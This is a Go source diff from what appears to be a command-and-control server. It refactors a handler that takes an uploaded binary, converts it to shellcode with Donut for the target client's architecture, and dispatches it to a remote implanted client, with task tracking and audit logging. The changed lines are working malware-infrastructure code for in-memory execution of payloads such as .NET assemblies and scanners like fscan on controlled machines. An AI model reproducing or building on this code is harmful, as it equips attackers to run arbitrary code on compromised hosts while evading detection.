@@ -217,17 +217,20 @@ func ExecuteBin(c *gin.Context) {
 	}
 	defer src.Close()
 
-	// 读取文件内容到字节数组
+	// 读文件内容到字节数组
 	fileBytes, err := io.ReadAll(src)
 	if err != nil {
 		c.JSON(200, gin.H{"status": 400, "data": "Unable to read file"})
 		return
 	}
 
-	uid := c.PostForm("uid")
-	args := c.PostForm("args")
-	mode := c.PostForm("mode")
+	executeBinPayload(c, c.PostForm("uid"), c.PostForm("args"), c.PostForm("mode"), file.Filename, fileBytes)
+}
 
+// executeBinPayload 是 /bin/execute（浏览器上传）与 /plugin/execute（按插件 ID）
+// 共用的下发逻辑：校验客户端/模式/平台 → 建 exec 任务 → 组帧下发。
+// 两条入口的校验与任务语义必须完全一致，避免"上传执行"与"仓库执行"行为漂移。
+func executeBinPayload(c *gin.Context, uid, args, mode, fileName string, fileBytes []byte) {
 	if uid == "" {
 		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": "缺少 uid"})
 		return
@@ -255,10 +258,10 @@ func ExecuteBin(c *gin.Context) {
 		return
 	}
 	// 按模式的上限：.NET 程序集在客户端有 10MB 硬限制（见 maxAssemblyBytes 注释）
-	if mode == "execute-assembly" && file.Size > maxAssemblyBytes {
+	if mode == "execute-assembly" && len(fileBytes) > maxAssemblyBytes {
 		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": fmt.Sprintf(
 			"程序集过大: %d bytes（execute-assembly 上限 %d bytes，客户端硬限制）",
-			file.Size, maxAssemblyBytes)})
+			len(fileBytes), maxAssemblyBytes)})
 		return
 	}
 
@@ -267,19 +270,19 @@ func ExecuteBin(c *gin.Context) {
 		return
 	}
 
-	auditBinExecute(c, "START", mode, uid, file.Filename, len(fileBytes), args, "")
+	auditBinExecute(c, "START", mode, uid, fileName, len(fileBytes), args, "")
 
 	// 任务记录（kind=exec）：成功投递后保持 dispatched；新客户端由 EXEC_DONE
 	// 携带 taskID 精确收敛，旧客户端仍按输出近似完成（OnTaskOutput 兼容）。
 	var execTaskID int64
 	if _, rows := createTaskRows([]string{uid}, operatorFromContext(c), "exec",
-		mode+" "+file.Filename+" "+args); len(rows) > 0 {
+		mode+" "+fileName+" "+args); len(rows) > 0 {
 		execTaskID = rows[0].Id
 	}
 	execCapable := command.IsExecClientCapable(uid)
 
 	// 记录到 shell 历史（校验通过后再写：原来非法 mode 也会污染历史）
-	database.AppendShellContent(uid, "$ "+mode+" "+file.Filename+" "+args+"\n")
+	database.AppendShellContent(uid, "$ "+mode+" "+fileName+" "+args+"\n")
 
 	// finish 统一投递并回执。投递失败必须让调用方看到——原来 sendByProtocol 只打日志，
 	// 接口一律返回 200，前端因此一直显示"命令已发送"而载荷其实被丢弃。
@@ -287,12 +290,12 @@ func ExecuteBin(c *gin.Context) {
 		if err := sendcommand.SendFileUploadCommandChecked(uid, payload); err != nil {
 			logx.Warnf("❌ [BIN-EXECUTE] 载荷下发失败: uid=%s mode=%s err=%v\n", uid, mode, err)
 			finishTask(execTaskID, taskStatusFailed, "", err.Error())
-			auditBinExecute(c, "FAILURE", mode, uid, file.Filename, len(fileBytes), args, err.Error())
+			auditBinExecute(c, "FAILURE", mode, uid, fileName, len(fileBytes), args, err.Error())
 			c.JSON(http.StatusServiceUnavailable, gin.H{"status": 503, "data": "命令下发失败: " + err.Error()})
 			return
 		}
-		auditBinExecute(c, "SUCCESS", mode, uid, file.Filename, len(fileBytes), args, "")
-		publishOperatorAction(uid, operatorFromContext(c), "exec", mode+" "+file.Filename)
+		auditBinExecute(c, "SUCCESS", mode, uid, fileName, len(fileBytes), args, "")
+		publishOperatorAction(uid, operatorFromContext(c), "exec", mode+" "+fileName)
 		// 带上任务 ID：调用方（插件页）据此轮询真实终态，不再靠"输出稳定 N 次"猜完成
 		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "task_id": execTaskID})
 	}
@@ -311,9 +314,9 @@ func ExecuteBin(c *gin.Context) {
 
 		payload, err := godonut.GenShellcode(fileBytes, args, u.Arch)
 		if err != nil {
-			errorMsg := fmt.Sprintf("Unable to generate shellcode for %s: %v\n\nInline Bin mode requires files that can be converted to shellcode.\n\nFor fscan.exe and similar tools, please:\n1. Use traditional file upload and execution\n2. Convert to shellcode format first\n3. Use a shellcode generator tool", file.Filename, err)
+			errorMsg := fmt.Sprintf("Unable to generate shellcode for %s: %v\n\nInline Bin mode requires files that can be converted to shellcode.\n\nFor fscan.exe and similar tools, please:\n1. Use traditional file upload and execution\n2. Convert to shellcode format first\n3. Use a shellcode generator tool", fileName, err)
 			finishTask(execTaskID, taskStatusFailed, "", "Donut 转换失败: "+err.Error())
-			auditBinExecute(c, "FAILURE", mode, uid, file.Filename, len(fileBytes), args, "Donut 转换失败: "+err.Error())
+			auditBinExecute(c, "FAILURE", mode, uid, fileName, len(fileBytes), args, "Donut 转换失败: "+err.Error())
 			c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": errorMsg, "task_id": execTaskID})
 			return
 		}
